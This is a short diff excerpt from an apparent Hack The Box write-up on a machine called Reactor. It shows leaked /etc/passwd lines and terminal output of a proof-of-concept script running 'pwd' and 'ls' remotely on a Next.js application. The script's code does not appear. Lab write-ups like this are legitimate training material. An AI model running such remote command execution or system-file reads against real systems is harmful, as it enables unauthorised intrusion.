@@ -952,6 +952,18 @@ engineer:x:1000:1000:engineer:/home/engineer:/bin/bash
 node:x:999:988::/home/node:/usr/sbin/nologin
 _laurel:x:996:987::/var/log/laurel:/bin/false
 
+┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
+└─$ python3 poc.py "pwd"                 
+/opt/reactor-app
+
+┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
+└─$ python3 poc.py "ls" 
+app
+next.config.js
+node_modules
+package.json
+package-lock.json
+reactor.db
 
 ```
 <div align="center">
